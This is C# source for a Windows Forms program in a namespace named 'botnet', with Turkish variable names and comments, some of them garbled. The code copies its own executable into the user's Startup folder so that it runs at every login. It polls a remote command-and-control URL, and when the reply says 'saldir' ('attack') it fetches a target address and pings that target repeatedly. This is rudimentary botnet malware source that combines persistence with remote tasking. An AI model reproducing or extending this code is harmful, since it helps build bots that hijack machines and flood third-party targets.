using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;


namespace botnet
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void saveFileDialog1_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\botnet.exe"))
            {
                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\botnet.exe");
            }


            timer1.Start();


            




        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string adrees = "https://lutfiaydemir.com/start.php";
            WebRequest istek = HttpWebRequest.Create(adrees);
            WebResponse cevap;
            cevap = istek.GetResponse();
            StreamReader donenbilgiler = new StreamReader(cevap.GetResponseStream());
            string gelen = donenbilgiler.ReadToEnd();
            int basl�kbaslangic = gelen.IndexOf("<title>") + 7;
            int basl�kbitisi = gelen.Substring(basl�kbaslangic).IndexOf("</title>");
            string basl�k = gelen.Substring(basl�kbaslangic, basl�kbitisi);
            
            if (basl�k == "saldir")
            {
                
                
                 
                timer2.Start();
               




            }
            else
            {
                timer2.Stop();
                MessageBox.Show("dur");
                
            }
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            string adress = "https://lutfiaydemir.com/start1.php";
            WebRequest istekk = HttpWebRequest.Create(adress);
            WebResponse cevapp;
            cevapp = istekk.GetResponse();
            StreamReader donenbilgilerr = new StreamReader(cevapp.GetResponseStream());
            string gelenn = donenbilgilerr.ReadToEnd();
            int basl�kbaslangicc = gelenn.IndexOf("<title>") + 7;
            int basl�kbitisii = gelenn.Substring(basl�kbaslangicc).IndexOf("</title>");
            string adres = gelenn.Substring(basl�kbaslangicc, basl�kbitisii);

            Ping myPing = new Ping();

            PingOptions pOptions = new PingOptions();

            pOptions.DontFragment = true;




            byte[] myByte = new byte[32];

            //


            PingReply pReply = myPing.Send(adres, 5000, myByte, pOptions);




            //IP adresine ula�abiliyorsak ve yan�tda ald�ysak Success olarak d�n�� yapacak

            if (pReply.Status == IPStatus.Success)

            {

                MessageBox.Show("Sald�r� devam ediyor");

            }

            //Ip adresine ula�am�yorsak TimedOut d�n�� yapacak

            else if (pReply.Status == IPStatus.TimedOut)

            {

                Console.WriteLine("Time out");

            }

        }


    }
}